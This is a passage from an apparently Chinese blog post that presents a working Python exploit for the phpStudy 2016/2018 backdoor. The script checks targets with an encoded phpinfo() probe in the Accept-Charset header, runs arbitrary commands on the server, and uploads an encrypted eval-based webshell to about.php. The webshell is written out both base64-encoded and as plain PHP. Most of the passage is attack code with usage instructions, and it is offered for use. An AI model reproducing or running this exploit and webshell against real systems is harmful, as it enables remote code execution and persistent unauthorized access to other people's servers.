= random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The Target Url'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w8'</span>,<span class="string">'--webshell_8'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2018'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w6'</span>,<span class="string">'--webshell_6'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2016'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(parse.print_help())</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &lt; <span class="number">4</span> <span class="keyword">and</span> len(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.check_Target()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_8:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2018()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_6:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2016()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>phpstudy 2018</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983146.36.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983187.58.png" alt></p><p>phpstudy 2016</p><blockquote><p>唯一有变化的就是上传shell的时候，根路径和2018不一样,路径修改如下</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">'./WWW/about.php'</span>, <span class="string">'&lt;?php</span></span><br><span class="line"><span class="string">@error_reporting(0);</span></span><br><span class="line"><span class="string">session_start();</span></span><br><span class="line"><span class="string">if (isset($_GET["pass"]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=substr(md5(uniqid(rand())),16);</span></span><br><span class="line"><span class="string">    $_SESSION["k"]=$key;</span></span><br><span class="line"><span class="string">    print $key;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=$_SESSION["k"];</span></span><br><span class="line"><span class="string">$post=file_get_contents("php://input");</span></span><br><span class="line"><span class="string">if(!extension_loaded("openssl"))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">$t="base64_"."decode";</span></span><br><span class="line"><span class="string">$post=$t($post."");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for($i=0;$i&lt;strlen($post);$i++) &#123;</span></span><br><span class="line"><span class="string">     $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">$post=openssl_decrypt($post, "AES128", $key);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">    $arr=explode("|",$post);</span></span><br><span class="line"><span class="string">    $func=$arr[0];</span></span><br><span class="line"><span class="string">    $params=$arr[1];</span></span><br><span class="line"><span class="string">class C&#123;public function __construct($p) &#123;eval($p."");&#125;&#125;</span></span><br><span class="line"><span class="string">@new C($params);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;'</span>);</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983388.91.png" alt></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983409.4.png" alt></p><h4 id="不带参数检测、利用、传shell"><a href="#不带参数检测、利用、传shell" class="headerlink" title="不带参数检测、利用、传shell"></a>不带参数检测、利用、传shell</h4><blockquote><p>和带参数的效果一样，就不放图了，不同的是执行命令传shell时没有解析参数时被转义的问题了</p></blockquote><p>code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = 